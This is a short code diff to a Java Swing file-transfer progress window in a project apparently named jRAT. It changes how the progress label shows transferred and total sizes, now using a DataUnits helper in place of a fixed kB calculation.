@@ -24,6 +24,7 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.ui.renderers.table.FileTransferTableRenderer;
 import se.jrat.client.utils.IconUtils;
+import se.jrat.common.utils.DataUnits;
 
 
 @SuppressWarnings("serial")
@@ -140,8 +141,12 @@ public class FrameFileTransfer extends BaseFrame {
 			progressBar.setValue(i);
 			model.setValueAt(i, getRow(path), 2);
 		} catch (Exception ex) {
+		
 		}
-		label.setText("Transferring " + new File(path).getName() + " " + (bytes / 1024) + "/" + (all / 1024) + " kB");
+		
+		String b = DataUnits.getAsString((long) bytes);
+		String a = DataUnits.getAsString((long) all);
+		label.setText("Transferring " + new File(path).getName() + " " + b + "/" + a);
 	}
 
 	public void done(String path, String bytes) {
